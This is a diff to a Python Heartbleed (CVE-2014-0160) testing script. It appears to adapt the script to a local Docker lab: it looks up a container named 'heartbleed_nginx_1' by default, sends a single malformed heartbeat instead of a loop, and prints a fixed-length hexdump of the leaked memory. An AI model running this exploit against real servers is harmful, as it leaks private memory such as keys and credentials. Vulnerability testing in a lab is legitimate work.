@@ -9,7 +9,9 @@ import socket
 import time
 import select
 import re
+import subprocess
 from optparse import OptionParser
+
 
 options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
 options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
@@ -41,13 +43,12 @@ hb = h2bin('''
 ''')
 
 def hexdump(s):
-    for b in xrange(0, len(s), 16):
+    for b in xrange(0, 40 * 16, 16):
         lin = [c for c in s[b : b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
         data_to_print = '  %04x: %-48s %s' % (b, hxdat, pdat)
-        if '................' not in data_to_print:
-          print data_to_print
+        print data_to_print
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -107,8 +108,11 @@ def hit_hb(s):
 def main():
     opts, args = options.parse_args()
     if len(args) < 1:
-        options.print_help()
-        return
+        output = subprocess.check_output([
+          'bash', '-c', "docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' heartbleed_nginx_1"
+        ])
+        print 'Using ' + output.strip()
+        args.append(output.strip())
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print 'Connecting...'
@@ -129,11 +133,11 @@ def main():
             break
 
     # print 'Sending heartbeat request...'
-    while True:
-      sys.stdout.flush()
-      s.send(hb)
-      hit_hb(s)
-      time.sleep(0.1)
+    # while True:
+    sys.stdout.flush()
+    s.send(hb)
+    hit_hb(s)
+    # time.sleep(2)
 
 if __name__ == '__main__':
     main()
